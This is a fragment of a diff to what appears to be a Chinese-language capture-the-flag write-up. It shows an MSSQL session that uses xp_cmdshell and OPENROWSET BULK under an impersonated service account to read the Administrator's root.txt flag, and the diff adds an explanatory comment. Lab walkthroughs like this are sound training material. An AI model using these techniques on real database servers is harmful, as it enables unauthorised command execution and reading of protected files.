@@ -125,7 +125,7 @@ SQL (SIGNED\Administrator  dbo@master)> xp_cmdshell "type C:\Users\mssqlsvc\Desk
 
 SQL (SIGNED\mssqlsvc  dbo@master)> xp_cmdshell "whoami /groups" 
 Mandatory Label\High Mandatory Level       Label            S-1-16-12288//高完整性（High Integrity）服务上下文|但是OPENROWSET使用BULK关键字可以读取使用这些组的文件                                                                                                 
-SQL (SIGNED\mssqlsvc  dbo@master)> SELECT * FROM OPENROWSET(BULK 'C:\Users\Administrator\Desktop\root.txt', SINGLE_CLOB) AS Contents;
+SQL (SIGNED\mssqlsvc  dbo@master)> SELECT * FROM OPENROWSET(BULK 'C:\Users\Administrator\Desktop\root.txt', SINGLE_CLOB) AS Contents; //从外部数据源读取数据
 BulkColumn                                
 ---------------------------------------   
 b'cbfcf88****************************\r\n'   
